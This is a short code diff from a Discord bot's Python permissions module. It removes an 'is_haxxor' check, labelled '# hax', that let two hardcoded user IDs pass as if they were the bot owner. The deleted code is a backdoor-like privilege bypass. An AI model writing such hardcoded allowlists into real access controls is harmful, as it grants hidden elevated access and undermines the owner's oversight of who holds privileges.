@@ -80,13 +80,3 @@ def perms_check(
             return False, "I can't perform this action on someone with a higher or equal role than mine."
 
     return True, None
-
-
-# hax
-def is_haxxor():
-    async def predicate(ctx: commands.Context):
-        haxxors = [961063229168164864, 992915737129787602]
-        if await ctx.bot.is_owner(ctx.author) or ctx.author.id in haxxors:
-            return True
-        return False
-    return commands.check(predicate)
